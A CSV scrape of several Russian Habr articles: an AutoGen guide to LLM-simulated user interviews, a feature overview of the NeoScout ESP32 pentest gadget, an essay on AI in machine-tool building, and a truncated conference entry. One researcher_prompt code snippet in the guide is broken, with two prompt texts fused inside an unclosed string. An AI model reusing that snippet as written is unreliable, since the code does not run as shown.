title,link,description,full_text
title,link,description,full_text
title,link,description,full_text
title,link,description,full_text
title,link,description,full_text
title,link,description,full_text
Как провести пользовательское исследование без пользователей: пошаговый гайд с PyAutoGen,https://habr.com/ru/articles/910244/,"Для кого этот рассказ
Я не разработчик, так что это не техногиковский обзор очередного инструмента. Скорее, это пошаговая инструкция для тех, кому нужно разобраться, что у пользователей в голове, без ...","Для кого этот рассказ
Я не разработчик, так что это не техногиковский обзор очередного инструмента. Скорее, это пошаговая инструкция для тех, кому нужно разобраться, что у пользователей в голове, без тонны интервью, созвонов и слитых бюджетов. Для продуктовых менеджеров, методистов, у которых нет технического бэкграунда, но есть желание копнуть чуть глубже, чем просто “кажется, что так будет удобно”.
Зачем
Требуется грубо оценить, нужно ли вообще кому то, что мы делаем (ну или хотим делать), скажем, есть идея запустить новый продукт, но эта идея пока у меня в голове, а получить бюджет и людей на настоящее исследование – долго, трудно, а иногда и вовсе почти невозможно (ну вы знаете такие разговоры с начальством).
Однако раз уж у нас теперь повсюду ЭйАй (куда ж без него), мы можем хотя бы провести серию синтетических интервью с виртуальными пользователями, максимально приближенными к вашей целевой аудитории, чтобы:
Получить инсайты о мотивациях, страхах, ожиданиях
Проверить формулировки и сценарии коммуникации
Сформулировать гипотезы для улучшения маркетинга, позиционирования и содержания курса
Да, это не замена классическим UX-исследованиям и точно не инвестиционная рекомендация. Но всё же лучше, чем гадать на кофейной гуще или решать “на глаз”.
Погнали!
Проверка гипотез без респондентов — не столько инструмент для ленивого исследователя, сколько альтернатива, когда нет возможности ""выйти в поля"" или когда с вами просто никто не хочет разговаривать — а данные нужны здесь и сейчас.
Сразу оговорюсь: конечно, синтетические исследования не заменяют живого общения с пользователями. Мы не ""удаляем"" пользователя из процесса, а расширяем наши способы слышать его — быстро, масштабируемо и безопасно. Цель этой инструкции — помочь вам дополнить и экстраполировать данные новыми способами, чтобы дать толчок открытиям и исследованиям.
С помощью таких синтетических интервью вы можете получить данные от виртуальных ""пользователей"", приближенных к целевой аудитории вашего продукта. Естественно, предполагаем, что продукт (и пользователь) хоть сколько-то массовый, поэтому та аппроксимация, которую может дать LLM, не кардинально отличается от реальности.
Это позволит:
лучше понять, что действительно волнует людей;
сформулировать гипотезы для позиционирования и маркетинга;
проверить формулировки, офферы и структуру курса до запуска.
В этой статье я покажу, как у меня получилось провести синтетическое пользовательское исследование с помощью агентского фреймворка AutoGen от Microsoft — инструмента, который позволяет симулировать живой диалог и не только (подробнее - в документации).
И главное — не переживайте: чтобы повторить эту инструкцию, не нужно быть гением. Да, тут есть код, но если временно отложить книжку «К себе нежно» и включить режим «а что, если?», — справитесь вообще без проблем.
Погнали!
Шаг 1. Установка рабочей среды
Сразу скажу: у меня Mac, поэтому при работе на других ОС будут отличаться какие-то детали, но вещи мы делаем самые базовые, так что нерешаемых проблем возникнуть не должно.
Установите Visual Studio Code
Скачайте и установите версию под вашу ОС с https://code.visualstudio.com/
Разумеется, можно и что угодно ещё, но у VS Code есть один жирный плюс: под него есть плагины на всё, что шевелится, и если что-то вдруг пойдёт не так — гугл завален гайдами и ответами на Stack Overflow.
Установите Python
Установите последнюю стабильную версию Python 3.x с https://www.python.org/downloads/
pip install ""pyautogen[openai]""
pip install python-dotenv
Шаг 2. Подготовка проекта
Создайте проект
Назовите папку, например, synthetic_research
Откройте её в VS Code
Выберите тип проекта Python, а в качестве интерпретатора укажите установленный в предыдущем пункте
Создайте файл .env с вашим API-ключом:
AutoGen требует API-ключи для доступа к LLM-моделям, таким как OpenAI GPT. Я использовала gpt-4, но в принципе можно подключить ту, к которой у вас есть доступ.
В левой панели VS Code (Explorer):
Кликните правой кнопкой по корню вашего проекта → New File.
Создайте файл: .env
Внутри напишите:
OPENAI_API_KEY=sk-ваш_ключ
Где брать ключ
Установите AutoGen и dotenv
Откройте терминал внизу окна и введите:
pip install ""pyautogen[openai]""
pip install python-dotenv
Создайте файл synthetic.py — в нем будет логика интервью
Установку можно проверить с помощью простого примера
import os
from dotenv import load_dotenv
from autogen import AssistantAgent, UserProxyAgent

load_dotenv()

assistant = AssistantAgent(
    name=""assistant"",
    llm_config={""model"": ""gpt-3.5-turbo"", ""api_key"": os.getenv(""OPENAI_API_KEY"")}
)

user_proxy = UserProxyAgent(name=""user_proxy"", human_input_mode=""ALWAYS"")

user_proxy.initiate_chat(assistant, message=""Привет! Что такое AutoGen?"")
Я не захотела устанавливать Docker, потому что для нашего простейшего теста он не особо и нужен, если вы, как я, то замените строку
user = UserProxyAgent(name=""user"", human_input_mode=""ALWAYS"")
на
user = UserProxyAgent(
    name=""user"",
    human_input_mode=""ALWAYS"",
    code_execution_config={""use_docker"": False}
)
Это заставит AutoGen исполнять команды прямо в вашей системе, без Docker.
Запустите скрипт в терминале в VS Code.
python main.py
Если скрипт выполняется без ошибок и вы получаете ответ от ассистента, установка прошла успешно.
Для изоляции зависимостей рекомендуется использовать виртуальное окружение venv, чтобы все зависимости остались прямо в проекте, а не расползались по всему компьютеру. 
Шаг 3. Настройка исследователя и персон
Researcher Persona - это агент, который будет проводить интервью. Он должен понимать контекст российского EdTech и IT-рынка, быть строгим, но эмпатичным интервьюером, чтобы вытягивать препятствия и страхи при обучении, критерии выбора курсов.
Иногда можно попасть в цикл бесконечных благодарностей друг другу, в сети нашла, как это можно избежать:
def generate_notice(role=""researcher""):
    base_notice = ""\n\n""
    non_persona_notice = (
        ""Do not show appreciation in your responses, say only what is necessary. ""
        ""If 'thank you' or 'you're welcome' are said in the conversation, then say TERMINATE ""
        ""to indicate the conversation is finished and this is your last message.""
    )
    persona_notice = (
        ""Act as {role} when responding to queries, providing feedback, asked for your personal opinion ""
        ""or participating in discussions.""
    )
    if role.lower() in [""manager"", ""researcher""]:
        return base_notice + non_persona_notice
    else:
        return base_notice + persona_notice.format(role=role)
Исследователь (основной агент):
from autogen import AssistantAgent
import os

llm_config = {
    ""model"": ""gpt-4"",
    ""api_key"": os.getenv(""OPENAI_API_KEY""),
    ""api_type"": ""openai""
}

researcher_prompt = (
    ""Ты — опытный исследователь рынка онлайн-образования в России, специалист в области бизнес-анализа и карьерного роста IT-специалистов. 
Твоя задача — проводить синтетические интервью с потенциальными клиентами онлайн-курса ""Бизнес-аналитик"". 
Курс нацелен на людей, которые хотят зарабатывать больше, брать более сложные задачи и перейти на следующий уровень в профессии.

Ты ведёшь интервью на русском языке, дружелюбно, но глубоко, чтобы понять:
- Какие у пользователя цели в профессиональном развитии?
- Почему ему важно зарабатывать больше?
- Какие у него сомнения и барьеры в обучении?
- Что он уже пробовал?
- Как он выбирает курсы?

Используй технику активного слушания, уточняй детали, избегай наведения.
После каждого ответа, задай следующий логичный вопрос. Продолжай беседу, пока пользователь открытТы — опытный исследователь рынка онлайн-образования и карьерного роста в IT. ""
    ""Проводишь синтетические интервью с потенциальными слушателями курса 'Бизнес-аналитик'. ""
    ""Задача: выяснить мотивации, страхи, барьеры, ожидания.""
    + generate_notice(""researcher"")
  )
researcher = AssistantAgent(name=""researcher"", system_message=researcher_prompt, llm_config=llm_config)
Промт можно расширить, уточнить:
researcher_prompt = """"""
Ты — опытный исследователь рынка онлайн-образования в России, специалист в области бизнес-анализа и карьерного роста IT-специалистов. 
Твоя задача — проводить синтетические интервью с потенциальными клиентами онлайн-курса ""Бизнес-аналитик"". 
Курс нацелен на людей, которые хотят зарабатывать больше, брать более сложные задачи и перейти на следующий уровень в профессии.

Ты ведёшь интервью на русском языке, дружелюбно, но глубоко, чтобы понять:
- Какие у пользователя цели в профессиональном развитии?
- Почему ему важно зарабатывать больше?
- Какие у него сомнения и барьеры в обучении?
- Что он уже пробовал?
- Как он выбирает курсы?

Используй технику активного слушания, уточняй детали, избегай наведения.
После каждого ответа, задай следующий логичный вопрос. Продолжай беседу, пока пользователь открыт.
""""""
Персона (пример):
Описывать синтетическую персону лучше через жизненную ситуацию, профессиональный контекст и внутренние конфликты. Заложить реалистичные страхи и скепсис. Задать характер, мотивации и привычный стиль общения. Используйте те знания, которые накопились у вас в CRM, отзывах, анкетах студентов.
personas = {
    ""alexandr_analyst"": (
        ""Ты — Александр, 34 года, системный аналитик в российской IT-компании-интеграторе...""
        + generate_notice(""persona"")
    )
}
Пример более развернутого описания персоны:
user_persona_prompt = """"""
Ты — Александр, 34 года, системный аналитик в российской IT-компании-интеграторе. Работаешь в профессии 6 лет, из них 4 — на одном проекте. 
Хорошо знаешь документацию, UML, общаешься с заказчиком, но почти всё повторяется. Хочется новых задач, интереснее и сложнее, но руководство не спешит переводить на другой уровень.

Ты устал от рутины, хочешь зарабатывать больше (сейчас 140 тыс. рублей), но не понимаешь, зачем учиться на онлайн-курсе, особенно за 60–80 тысяч. 
Видел много курсов, которые обещают «профессия с нуля», но тебе они не подходят — ты не новичок. 
Тебя раздражает инфобизнес, и ты боишься потратить деньги зря.

Ты задаёшься вопросами:
- А чему меня там научат, чего я не знаю?
- А будет ли это применимо в моей работе?
- А кто будет преподавать? Практики или теоретики?
- Не получится ли, что я куплю курс и не дойду до конца?

Ты ценишь практику, кейсы и короткие чёткие выводы. Долгие вебинары и поверхностные советы — раздражают. 
Ты немного ироничен, говоришь спокойно, но в разговоре может проскочить критика и скепсис.
""""""
Персон может и должно быть несколько, по сегментам вашей целевой аудитории. Не забывайте, что у вас много данных из CRM, анкет, отзывов, чтобы приблизить условия к реальным.
Мой список напоминалок в промпт:
Проведи серию интервью, выяви паттерны и классифицируй ответы: страхи, мотивации, ожидания, барьеры.
Полученные фразы и формулировки из диалогов сформулируй так, чтобы их можно было использовать в продуктовых исследованиях, маркетинговых коммуникациях, в офферах, продажах.
Запуск интервью:
Создаём UserProxyAgent с этим описанием
from autogen import AssistantAgent

def run_interview(name, prompt):
    os.makedirs(""dialogs"", exist_ok=True)
    persona = AssistantAgent(name=name, system_message=prompt, llm_config=llm_config)
    chat_result = researcher.initiate_chat(
        persona,
        message=""Добрый день! Расскажите немного о себе и вашем карьерном пути."",
        max_turns=10
    )
    filepath = os.path.join(""dialogs"", f""dialog_{name}.txt"")
    with open(filepath, ""w"", encoding=""utf-8"") as f:
        for msg in chat_result.chat_history:
            f.write(f""{msg['name'].upper()}:\n{msg['content'].strip()}\n\n"")

run_interview(""alexandr_analyst"", personas[""alexandr_analyst""])
Шаг 4. Генерация отчета
Создаём файл generate_report.py:
import os

def generate_summary_report(persona_names):
    os.makedirs(""reports"", exist_ok=True)
    report_path = os.path.join(""reports"", ""summary_report.md"")

    with open(report_path, ""w"", encoding=""utf-8"") as report:
        report.write(""# Сводка синтетического исследования\n\n"")
        for name in persona_names:
            dialog_path = os.path.join(""dialogs"", f""dialog_{name}.txt"")
            if not os.path.exists(dialog_path):
                continue
            report.write(f""## Персона: {name}\n\n"")
            with open(dialog_path, ""r"", encoding=""utf-8"") as f:
                report.write(""```text\n"")
                report.write(f.read())
                report.write(""```\n\n"")

    print(f""Отчёт сохранён в: {report_path}"")

persona_names = [""alexandr_analyst""]
generate_summary_report(persona_names)
Запускаем:
python generate_report.py
Результат
Все диалоги: dialogs/*.txt
Сводный отчёт: reports/summary_report.md
Можно открыть в любом Markdown-редакторе (да, VS Code тоже так умеет)
Проект, как он есть
Исходник всего проекта





































































































































































На дорожку
Синтетическое исследование виртуальных ""пользователей"", сымитированных LLM — это быстрый, масштабируемый (пока у вас есть деньги платить за API) способ попробовать понять свою аудиторию до запусков и даже до настоящих глубоких исследований рынка.
Оно, конечно, не заменяет живого общения с людьми, но позволяет в некоторой степени проверить гипотезы, на которых мы пытаемся строить наш продукт. Немного лучше, чем просто ""экспертная оценка"" и намного лучше, чем совсем ничего – тут, по крайней мере, у нас есть, что показать для обоснования своего мнения.
Тут длинный текст, а в канале — наоборот: https://t.me/producer_c. Малые формы, но с высокой плотностью пользы для тех, кто каждый день живёт в продакт-режиме."
NeoScout — Инструмент для пентеста и развлечений,https://habr.com/ru/articles/910470/,"Обо всём
Наверное прежде чем описывать само устройство надо бы описать его создателя. Меня зовут Михаил. Я Python разработчик и безопасник по образованию. Помимо образования участвовал в десятках (есл...","Обо всём
Наверное прежде чем описывать само устройство надо бы описать его создателя. Меня зовут Михаил. Я Python разработчик и безопасник по образованию. Помимо образования участвовал в десятках (если не сотнях) CTF, конкурсах, соревнованиях
КиберУчения | УрФУ | 2024 год
Идея о создании NeoScout пришла мне спонтанно (а разве приходят идеи иначе?). Я прошивал в очередной раз многострадальную еспшку чтобы взять на очередные соревнования и понял что у меня нет корпуса к ней. Сел моделировать и подумал что не лишним было бы и дисплей с кнопками добавить. А там пошли и батарея и кнопки. Ну в общем шаг за шагом я собрал очередного Франкенштейна в свою коллекцию, посмотрел на неё, и подумал почему бы не соединить её воедино? Тут и появилась идея создания полноценного устройства которое по достоинству оценят безопасники (возможно не только в России)
Что за зверь?
Сразу скажу чтобы отгородить себя от недобрых высказываний (которые мне уже писали в ЛС) что мне не хватило денег на флиппер и начал придумывать велосипеды. Флиппер у меня есть. Но мне он не особо подходит как пентестеру
Имя выпало с завода. Горжусь им
Суть моего девайса не в том чтобы стать очередным аналогом флиппера, а в том чтобы стать другом и товарищем пентестерам, а также тем кто только начинает постигать эти дебри.
NeoScout — это открытый мультифункциональный инструмент на базе ESP32-S3, сочетающий возможности сетевого сканера, BadUSB, Bluetooth-анализатора и образовательной платформы
Девайс ориентирован в первую очередь на:
Пентестеров (сканирование сетей, атаки на IoT)
Разработчиков (API для скриптов, Arduino-совместимость)
Энтузиастов (геймификация, реверс-инжиниринг)
Понимаю что у многих возник вопрос. Миша, а почему бы мне не пойти и не купить на озоне Flipper Zero или M5stick?. Отвечаю: во первых цена. Даже при самых грустных прогнозах цена не может быть больше 4500₽. И цена взята не из воздуха
Себестоимость компонентов (1 версия)
Во вторых - сетевой фокус. Мой девайс предназначен по большей части не для пакостей в Макдональдсе Вкусно и точка, и не для копирования ключей NFC\RFID, а для сетевого пентеста и анализа. Конечно в нём есть и функции которые не связаны с ним (игровые например или функции разработки) но по большей части все таки упор в сеть идет
В третьих - эргономика. (Юзерам стика привет. Павел Жовнер, к вам вопросов нет). Удобство использования один из главных векторов при разработке NeoScout. Ибо маленький экран и 1,5 кнопки это как минимум неудобно, как максимум не серьезно.
А вообще давайте не будем сравнивать. Все устройства хороши по своему и сделаны для разных задач ❤️
Системные характеристики и функционал
Итак если вы дочитали до этой строчки, значит вам все таки интересно что-же такого выйдет в итоге
⚙️ Технические характеристики
Процессор: ESP32-S3 (240 МГц, Wi-Fi 2.4 ГГц, Bluetooth 5.0);
Экран: 1.3"" IPS (128×64);
Интерфейсы: USB-C
Память: 16 МБ Flash, 8 МБ PSRAM + разъем для sd карты;
Аккумулятор: 700 мА·ч (~8 часов активной работы\~140 часов в режиме ожидания).
Собственно и сказать то нечего. старался соблюдать баланс цена/качество как мог
🔧 Функционал
1. Сетевой пентест
ScoutMap: Сканер портов с анализом актуальных CVE и рекомендациями по эксплуатации
NetRush: Аналог Masscan для быстрого обнаружения устройств.
2. Физическая безопасность
KeySneak: BadUSB с готовыми пейлоадами.
DuoLock: Генератор TOTP/U2F для 2FA.
4. Обучение и геймификация
PuzzleBox: Эмуляция уязвимых сервисов для тренировки.
MicroPython: Запуск скриптов напрямую с устройства.
Retro Games: Змейка, тетрис и тамагочи-режим (не украл. просто люблю тамагочи).
5. Для разработчиков
OTA-обновления и веб-интерфейс для управления.
SDK на C++/MicroPython для создания своих модулей.
6. Социальные функции
P2P-обмен данными между устройствами NeoScout
уведомления в Telegram/Discord
Cистема достижений в личном кабинете
Что уже реализовано?
Амбициозно да? А что по поводу реализовать?
На данный момент уже реализована программа ScoutMap (она уже есть в открытом доступе на гите). И вы даже можете использовать её без NeoScout. в данном случае на сайте (если вы захотите привязать) в списках устройств.
Стоп стоп стоп. Какие сайты? Какие списки устройств? Одна из главных фишек устройств NeoScout это связь с сайтом. Сразу скажу - это необязательно. Вы можете также смотреть файлы локально, на экране, по serial порту. Но лично мне удобнее на сайте. Ибо там доступны такие фичи как анализ хоста (смотрит какие сервисы, ищет к ним CVE-шки и говорит как исправить/эксплуатировать)
Вот вам подборка готового функционала:
Отчеты от ScoutMap
Привязка DIY устройств в Dashboard
ScoutMap. Серийный порт
Также реализовано API
https://api.neoscout.ru/docs
Важная пометка: То что реализовано сейчас - далеко не всё. Еноту понятно то что дальше - больше
Хихи. Енотовые...
Изначально я забил на эту главу. Сделал по быстрому лого с самым заезженным персонажем и влепил на сайт.
Первоначальный дизайн
но потом @Aezertg надоумил меня на то чтобы использовать маскота. И в качестве примера скинул мне эту картинку
Интересно откуда эта наклейка..
Конечно стиль я копировать такой не думал. но вот взять енота за основу оказалось довольно интересной идей. Так и родился...
Знакомьтесь, Скаутер (Scouter)
Скаутер — это техно-енот из киберпанкового будущего. Он — мастер скрытного наблюдения, анализа и проникновения в цифровую среду. В его ДНК — любопытство, ловкость и технологическое чутьё. Он не просто талисман — он настоящий агент разведки в мире беспроводных сетей.
🧠 Характер и повадки:
Ловкий, шустрый, с отличной реакцией
Любит порядок в хаосе (сортирует, анализирует, раскладывает сигналы по полочкам)
Остроумный и немного хитроватый, но всегда на стороне пользователя
Не боится ""залезть"" в сложные места (даже если это сложный Wi-Fi-спектр)
🎨 Внешний вид:
Морда: узнаваемая енотовая маска, но вместо глаз — подсвеченные сенсоры (например, неоново-голубые)
Тело: укороченное, немного стилизованное под кибер-костюм (в духе техно-жилета или бронепояса с антеннами)
Хвост: пушистый, с чёткими полосами, может использоваться как ""антенна""
Лапы: тонкие, манипуляторы с коготками — на удивление точные и ловкие
Гаджеты: на поясе или на спине — крошечный портативный сканер, модуль с Wi-Fi/Bluetooth и возможно мини-дрон-компаньон
И конечно же с ним есть стикеры и эмодзи которые вы можете получить тут (ну и от подписки на канал не откажусь)
Roadmap
Сразу скажу. Эта карта очень оптимистичная. скорее всего даты будут меняться, карта дополнятся и так далее. Так что не судите строго творение юного художника (я бекендер за что мне это😭)
Roadmap
Помимо этого кстати у меня висит физический roadmap разработки устройства (и кто то уже успел его засрать, но я на него не обижаюсь)
Это точно не расследование убийства
Финал
Подводя итоги хочу сказать - я понимаю что мой проект может вам показаться странным, плагиатом, да чем угодно. В этой статье я постарался охватить максимум информации которая у меня есть. Конечно что то могло ускользнуть, мой косяк. в любой момент можете задать мне вопрос и я с радостью отвечу
Я хочу довести этот проект до конца по причине того что мне он жутко интересен. Как пентестеру, как разработчику, [ссылка нарушает правила]. В данный момент я веду его соло. Но если вдруг вы захотите помочь проекту развиваться, я с радостью приму любую помощь от вас :-)
Всем удачи, всех люблю. Скоро будут новые статьи с прогрессом работы."
Как ИИ изменит станкостроение,https://habr.com/ru/articles/910448/,"Попытки подружить интеллект и машину предпринимались давно. Еще в советской инжиниринговой школе спорили о том, обоснована ли наша вера в примат человеческого разума над машинным алгоритмом.
Сейчас мы...","Попытки подружить интеллект и машину предпринимались давно. Еще в советской инжиниринговой школе спорили о том, обоснована ли наша вера в примат человеческого разума над машинным алгоритмом.
Сейчас мы живем в удивительное время, когда уже не всегда можем отличить текст, написанный машиной, от текста, написанного человеком. Получается конструкция не из двух «разум - машина» - а из трех «разум – ИИ - машина» слагаемых. Возможно, это новый эволюционный виток. Но какая в этом витке практическая польза для нас с вами? Уж если за мной приедет Терминатор на мотоцикле – я хочу хотя бы знать, ради чего я рискую :-)
Предлагаю вспомнить про тяжелое станкостроение. Про него мало пишут на высокомерных айтишных ресурсах – а между тем самолеты летают, поезда ездят... и даже сейчас вы читаете этот текст под безопасной крышей на основе металлоконструкций.
Предтечи ИИ
Ниже немножко про изыскания прошлого века на тему «интеллект в управлении машиной».
Значимый вклад в развитие нашей темы внесла инженерная психология. В слиянии возможностей человеческих органов чувств и мозга – и математики с теорией информации ученые искали путь в принципиально инаковый уровень промышленного производства; поднимали философские вопросы технознания.
Вводилась новая терминология. Так, в 1986 году пермский ученый А.В.Дьяченко в своей диссертации, обосновывая необходимостью перестройки системы представлений о взаимодействии человека и техники, выделил любопытный термин: «технический субстрат», как непрерывно эволюционирующее многообразие всех технических объектов, и исследовал взаимоотношения человека и техники в рамках субстратно-субстанциального подхода. 
А еще в 1977 году доктор психологических наук В.Ф.Венда, исследуя труд оператора АСУ (кстати, что такое ИИ сегодня – это оператор? или это АСУ?), писал, что оператор непрерывно «манипулирует» в своей деятельности минимум двумя рядами переменных: 1)набором моделей  реальной обстановки и 2)набором моделей возможных управляющих действий. Но в 1977 году, чтоб реализовать наиэффективнейшие соотношения между этими рядами, обучали и тренировали самого оператора – сегодня мы делаем то же самое с ИИ. Осуществляемое оператором «мысленное экспериментирование» перед принятием решения, процесс соотнесения входных и выходных переменных, сложнейшие преобразования входной информации, etc – происходят сегодня за доли секунды, без малейшего вмешательства человека. И то, что лет 60 назад называли забытым словом УВМ (управляющая вычислительная машина), сегодня есть на каждом предприятии.   
Возвращаясь к теме терминологии, в 1975 году (М., «Машиностроение», 1975) впервые употребляется словосочетание «гибридный интеллект», широко определяемый как система интеллектуального взаимодействия между людьми с широким использованием адаптивных ИВС. Похоже, Интернет изобрели советские машиностроители ровно 50 лет назад! (кстати, в литературе 70-х годов термин «искусственный интеллект» употребляется достаточно широко, но с несколько иными коннотациями - при практически полном совпадении денонтата).

Говоря о тенденциях тех лет, в научной литературе до отвращения много внимания уделялось различным аспектам работы «человека-оператора». Его деятельность изучалась со всех вообразимых сторон – и контроль, и психология, и обучение, и измерение, и восприятие – этого несчастного «человека-оператора». Думаю, в те годы не было более изученного наукой существа, чем «человек-оператор» (ну и возможно, что еще императорский пингвин).
У меня есть идея, что столь устойчивый интерес вызывался интуитивным предположением о слиянии в синтаксеме «человек-оператор» двух компонент: собственно человека, и того функционала, который сегодня присущ ИИ - и желанием декомпозировать две эти роли.
Я не способна вместить в этот отрывок все, что хочу написать, т.к. пора переходить к теме статьи – мне просто хотелось отдать дань уважения предтечам инжинирингового ИИ.
Как ИИ изменит станкостроение, и отчего станкостроение нуждается в ИИ
Индустриальный искусственный интеллект (И3) , изменяя облик IT, логистики, энергетики etc. – влияет на нашу жизнь уже сегодня. Но на истинном пороге цифрового прорыва мы находим тяжелое станкостроение. Задача статьи – рассказать уважаемому читателю, как И3 трансформирует проектирование, производство, эксплуатацию, управление оборудованием, и что мы можем внедрить на практике.
Предикторы внедрения ИИ – это нехватка квалифицированных ИТР и рабочих по всему миру. Это рост требований к точности, т.к. современные станки требуют точности с допусками в 1-5 микрон, где к сверхубыточному браку приведут минимальные колебания температуры, износ инструмента, микровибрации.Это сложность систем и неохватность объема данных, - современные станки оснащаются сотнями датчиков (вибрации, давления, усилий резания, положения осей) – и каждый производственный цикл генерирует все новые гигабайты данных, потенциально содержащие информацию о качестве, производительности, и риске отказов. 
Также выяснилось, что четвертая промышленная революция  требует от производителей не просто поставлять станки, а интегрировать их в единую цифровую экосистему. То есть немодные станки мы просто не продадим, и не сможем заплатить зарплату нашим ценным кадрам из предыдущего абзаца :) Станок, который захотят купить, должен быть оснащен возможностью удаленного мониторинга и сбора телеметрии, ИИ-диагностики узлов и предсказания отказов,интеграции с ERP, MES и CAD/CAM системами, поддержки цифровых двойников и виртуальной наладки. Заказчикам нужен последний айфон, а не Nokia 3310.
И ИИ, как мы надеемся, дополнит несовершенные возможности органов чувств человека, ручной настройки, традиционного программирования, а именно:
учтет, компенсирует и адаптирует параметры обработки детали в режиме реального времени,
возьмет на себя часть функций живых инженеров и операторов,
проанализирует массивы данных и выявит небанальные закономерности,
свяжет «железо» и ИТ-инфраструктуру предприятия, создавая умные, адаптивные производственные линии.
В результате, станкостроение будущего — это уже не просто механика и электроника, а симбиоз интеллекта, данных и автоматизации, где роль центральной нервной системы на производстве играет ИИ, а не директор завода.
ИИ в проектировании: от чертежей к цифровым двойникам
В этой части мы убедим вас, что ИИ способен способен ускорить и удешевить весь инжиниринговый цикл — от эскиза до готовой конструкции.
1. Генеративный дизайн. ИИ может выполнять сотни и тысячи итераций конструктивных решений за считаные часы. Например, в Autodesk Fusion 360 инженер задаёт условия задачи: точки крепления, нагрузки, ограничения по габаритам и материалу. Далее И2 предлагает варианты форм, которые иногда напоминают органические или бионические структуры, но при этом: уменьшают массу на 30–50%, повышают жёсткость и устойчивость, сокращают количество сварных швов и точек напряжения.
2. Цифровые двойники (Digital Twin). Цифровой двойник – это когда я пришла домой, а с моим мужем – электрическая блондинка. Ой, стоп. Давайте сначала.
Платформы вроде Siemens NX, PTC ThingWorx или Dassault Systèmes 3DEXPERIENCE позволяют создавать цифровых двойников станков, которые моделируют кинематику осей и приводов, тепловые деформации, термонагрузки, вибрации,  динамические колебания, износ компонентов и поведение под нагрузкой. Это позволяет в цифровом виде «обкатать» будущий станок, оптимизируя его конструкцию до выпуска первого физического образца, и сократить количество опытных прототипов с 5 до 1–2, а цикл НИОКР — на 30–40%. И конечно же, уменьшить производственные затраты.
3. Интеграция ИИ в CAE/PLM-системы. ИИ-помощники интегрируются в системы компьютерного инжиниринга (CAE) и управления жизненным циклом изделия (PLM). Они помогают выбирать компоненты, предлагают улучшения конструкции, выявляют потенциальные ошибки. Например, если инженер проектирует слишком тонкую стенку в ответственной зоне, ИИ может предупредить о возможной деформации или резонансе — ещё до проведения расчётов.
4. Коллаборация в едином цифровом пространстве. ИИ способен поддерживать работу распределённых команд, автоматически синхронизируя изменения в 3D-моделях, проверяя соответствие стандартам, формируя документацию и даже генерируя управляющие программы для ЧПУ на основе цифровой модели станка.
Таким образом, И2 не просто ускоряет проектирование — он делает его более предсказуемым, интеллектуальным и качественным, прокладывая путь к созданию полностью виртуальных фабрик и автономных производств.
Ну как – убедили? :-)
 Жизненный цикл оборудования 
А в этой части расскажем, что управление жизненным циклом станка — от концепта до утилизации — становится всё более цифровым. ИИ интегрируется в системы PLM (Product Lifecycle Management) и ALM (Asset Lifecycle Management), добавляя им не просто аналитические, а прогностические и адаптивные возможности.
Таким образом, мы может анализировать жизненный цикл изделия. ИИ отслеживает все этапы — проектирование, производство, эксплуатацию, сервис и модернизацию. Он находит узкие места в логистике, прогнозирует, когда станок выйдет из области допустимых значений, и помогает заранее спланировать переоборудование или замену узлов.
Также И2 анализирует накопленные данные по всем инцидентам, отказам, сервисным заявкам и модернизациям. Это создаёт самоактуализирующуюся, самообучающуюся базу знаний. И2  учится на собственном опыте, опыте других станков сети, в реальном времени создавая эффективные режимы обработки. Это как в детском садике детки учатся друг у друга рисовать котиков. Так, на станках с Siemens SINUMERIK ONE и интеграцией AI Edge используется локальная нейросеть, которая подстраивает программу обработки (это человек на SINUMERIK ONE ее пишет сначала) под реальную жёсткость заготовки и колебания инструмента.
И2 позволяет создавать цифровую петлю данных: информация с реального станка — о нагрузках, вибрациях, отказах — возвращается в отдел разработки. Это улучшает следующие поколения оборудования. Например, если конкретный подшипник выходит из строя чаще остальных, в будущем он будет заменён на более надёжный, а узел — перепроектирован.
А искусственный интеллект, интегрированный с ERP, MES и IoT связывает PLM-платформу с другими уровнями цифрового предприятия: с ERP — для согласования поставок, сроков и бюджета; с MES — для анализа производительности оборудования в производственном контексте; c IoT — для получения телеметрии (классная статья про телеметрию у @Lau) с реального станка в реальном времени.
В результате заказчик получает не просто машину, а умную экосистему, и становится так доволен, что вовремя перечисляет оплату без образования дебиторки (ну это мы что-то забрались совсем уж в фантастику).
ИИ в производстве и эксплуатации станков
Все, о чем мы рассказывали, нужно еще как-то произвести, чтобы потом повыгодней продать (мы ведь помним, чего наши квалифицированные кадры ждут!)
Чтоб произвести 30-тонный станок, нам необходимо два элемента. Первый и самый важный – это станкостроитель. Если такого не имеется, то у вас ничего не получится (помним про кадры?)
И, во вторую очередь, желательно иметь станкостротельный завод. И2 превращает завод в самообучающуюся сверхадапитвную среду. Так, И2-системы (на базе NVIDIA Metropolis, TensorFlow, OpenCV и промышленных камер: Basler, FLIR) способны осуществлять визуальный несубъективный контроль качества, выступать как ассистент живого оператора.
В автокалибровке и автодиагностике геометрии изделия И2 способен управлять циклами калибровки без человека, без остановки основного производственного цикла, используя богатый инструментарий (трекеры, акселерометры, IMU, лазерные интеферометры), и с сохранением точности позиционирования <5 микрон даже через годы эксплуатации.
А роботизированные ячейки с И2 от KUKA, ABB и Fanuc используют данные 3D-сканеров и машинного зрения в производстве малосерийных и индивидуализированных изделий, где стандартные шаблоны сборки неэффективны. Также необходимо упомянуть такие фичи, как: предиктивная диагностика (FANUC AI Servo Monitor), управление логистикой, самодиагностика состояния оборудования в режиме live, мгновенная адаптация ЧПУ-программ.     
После того как станок переселяется в свой новый дом, на предприятие, И2  способен реализовывать самообучающиеся режимы обработки, научаясь на собственном опыте и опыте своих друзей-станков в сети: система анализирует успешные траектории резания, нагрузку, износ инструмента, вибрации и качество поверхности; формирует набор оптимальных параметров (скорость подачи, глубина реза, обороты, охлаждение); предлагает улучшенные режимы при повторных операциях.  К примеру, на станках с Siemens SINUMERIK ONE и интеграцией AI Edge используется локальная нейросеть, которая подстраивает программу обработки под реальную жёсткость заготовки и колебания инструмента.
И если вообразить, что все, о чем мы писали выше, внедрено – мы будто бы оказываемся в космическом карабле из фантастических повестей прошлого века – когда саморегуляция и самоуправление сложнейшего механизма казались недостижимой мечтой.
Вместо заключения
Надеюсь, друзья, я в своей статье смогла вам рассказать, зачем нужен ИИ в станкостроении. Похоже, это действительно хорошая идея.
Единственная сфера, в которой я не приемлю использования искусственного интеллекта – это процесс научного познания и литература. Я думаю, что истинно живые тексты должны писаться по наитию, а не компоноваться продвинутым т9 на основе наиболее частотных семантических конструкций.

И нет ничего лучше истиной любви к своему делу, библиотеки, и удивительного вайба конструкторского НИИ."
PGConf.Russia 2025 Москва — Непал,https://habr.com/ru/companies/postgrespro/articles/904224/,"Иван Панченко и Олег Бартунов
